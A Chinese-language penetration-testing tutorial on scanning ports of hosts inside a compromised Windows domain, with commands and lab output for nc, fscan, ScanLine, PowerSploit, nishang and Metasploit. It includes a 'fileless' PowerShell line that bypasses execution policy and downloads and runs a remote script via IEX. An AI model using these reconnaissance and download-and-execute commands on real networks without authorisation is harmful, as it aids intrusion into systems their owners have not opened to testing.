---
title: 域内主机端口探测方法
---

# 前言
> 注：本文中的工具均来源自互联网，后门自查。工具可在狼盘下载 pan.wgpsec.org 

在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。

## 1、Telnet

如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。

```
C:\Users\daniel10>telnet dc 80
正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败

C:\Users\daniel10>telnet 192.168.7.7 443
正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败
```

## 2、nc

素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。

nc 下载地址：[https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

```
nc.exe -vv 192.168.7.7 3389
```

```
C:\Users\daniel10>nc.exe -vv 192.168.7.7 3389
DNS fwd/rev mismatch: DC != DC.teamssix.com
DC [192.168.7.7] 3389 (ms-wbt-server) open
```

拿来进行多个端口扫描也是可以的，就是扫描速度有点慢

```
nc.exe -rz -w 2 -vv 192.168.7.7 0-65535

-r 随机指定本地与远端主机的通信端口
-z 使用0输入/输出模式，只在扫描通信端口时使用
-w<超时秒数> 设置等待连线的时间
```

```
C:\Users\daniel10>nc.exe -rz -w 2 -vv 192.168.7.7 443-445
DNS fwd/rev mismatch: DC != DC.teamssix.com
DC [192.168.7.7] 444 (?): TIMEDOUT
DC [192.168.7.7] 443 (https): TIMEDOUT
DC [192.168.7.7] 445 (microsoft-ds) open
sent 0, rcvd 0
```

## 3、fscan

影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：[https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)

```
fscan.exe -h 192.168.7.7 -p 22,445
```

```
C:\Users\daniel10>fscan.exe -h 192.168.7.7 -p 22,445

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.5.1
scan start
(icmp) Target '192.168.7.7' is alive
icmp alive hosts len is: 1
192.168.7.7:445 open
[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)
scan end
```

## 4、ScanLine

McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：[www.mcafee.com/us/downloads/free-tools/termsofuse.aspx](www.mcafee.com/us/downloads/free-tools/termsofuse.aspx)

但是项目地址的下载按钮貌似失效了，其他的下载地址：[https://www.lanzous.com/i32zncf](https://www.lanzous.com/i32zncf)

```
scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7
```

```
C:\Users\daniel10>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7

ScanLine (TM) 1.01
Copyright (c) Foundstone, Inc. 2002
http://www.foundstone.com
Scan of 1 IP started at Wed Feb 24 21:31:11 2021
-------------------------------------------------------------------------------
192.168.7.7
Responds with ICMP unreachable: No
TCP ports: 445 3389
-------------------------------------------------------------------------------
Scan finished at Wed Feb 24 21:31:15 2021
1 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs
```

## 5、S 扫描器

S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：[https://pan.baidu.com/s/1gdGM4F5](https://pan.baidu.com/s/1gdGM4F5)

> 值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。

```
s.exe tcp 192.168.7.7 22,80,443,445 7
```

```
C:\Users\daniel10>s.exe tcp 192.168.7.7 22,80,443,445 7
TCP Port Scanner V1.1 By WinEggDrop

Normal Scan: About To Scan 4 Ports Using 7 Thread
192.168.7.7      445   Open
Scan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports
```

## 6、PowerShell 脚本

### PowerSploit

PowerSploit 的 Invoke-Portscan 脚本下载地址：[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1)

无文件形式（推荐）

```
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports '445,1433,80,8080,3389'"
```

> 如果报错，估计是网络的问题

有文件形式

```
powershell.exe -exec bypass -Command "Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports '445,1433,80,8080,3389'"
```

```
C:\Users\daniel10>powershell.exe -exec bypass -Command "Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Ho
sts 192.168.7.7 -T 4 -ports '445,1433,80,8080,3389'"

Hostname      : 192.168.7.7
alive         : True
openPorts     : {445, 3389}
closedPorts   : {8080, 80, 1433}
filteredPorts : {}
finishTime    : 2021/2/24 下午 21:14:06
```

### nishang

nishang 的 Invoke-Portscan 脚本下载地址：[https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1](https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1)

```
 Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445
```

```
PS C:\Users\daniel10> Import-Module .\Invoke-Portscan.ps1
PS C:\Users\daniel10> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445

IPAddress   HostName Ports
---------   -------- -----
192.168.7.7          {445}
```

## 7、MSF

万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：

```
auxiliary/scanner/portscan/ack          TCP ACK端口扫描
auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描
auxiliary/scanner/portscan/syn         	SYN端口扫描
auxiliary/scanner/portscan/tcp          TCP端口扫描  
auxiliary/scanner/portscan/xmas         TCP XMas端口扫描
……
```

除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。

> 参考文章：
>
> [https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/](https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/)